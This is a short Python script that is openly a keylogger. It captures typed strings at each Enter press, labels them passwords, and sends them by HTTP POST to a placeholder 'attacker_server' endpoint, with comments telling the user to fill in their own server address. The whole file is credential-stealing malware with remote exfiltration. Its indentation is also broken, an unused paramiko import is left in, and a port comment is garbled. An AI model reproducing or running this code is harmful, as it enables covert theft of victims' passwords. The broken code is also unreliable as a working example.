#!/usr/bin/env python3
import keyboard
import paramiko
import requests

# Define the URL of the attacker's server for remote data transfer
# Example: attacker_server = "http://attacker_ip:port"
# Replace "attacker_ip" with the actual IP address of your server
# Replace "port" with the appropriate port number (e.g., 8- for HTTP)
attacker_server = "attacker_ip:port"

# Specify the path for the log file
path = "/root/data.txt"
try:
    # Open the log file in 'append' mode
    with open(path, 'a') as data_file:
        # Continuously capture keystrokes
        while True:
            # Record the 'enter' key events
            events = keyboard.record('enter')
          
            # Extract the typed strings from the recorded events
            password = list(keyboard.get_typed_strings(events))

          # Check if any password is captured  
          if password:
              #uncomment the following line to save the password in the local log file
               #data_file.write('\n' + password[0])

                # Create a dictionary withe captured password
                data = {'password': password[0]}
            
                # Send a POST request to the attacker's server for remote logging
                requests.post(attacker_server + '/receive_data', data=data)
		
except Exception as e:
    # Handle exceptions and print an error message
    print(f"An error occurred: {e}")
finally:
    # This block is executed regardless of whether an exception occurs or not
    # Optionally, you can close the file or perform cleanup here
    pass
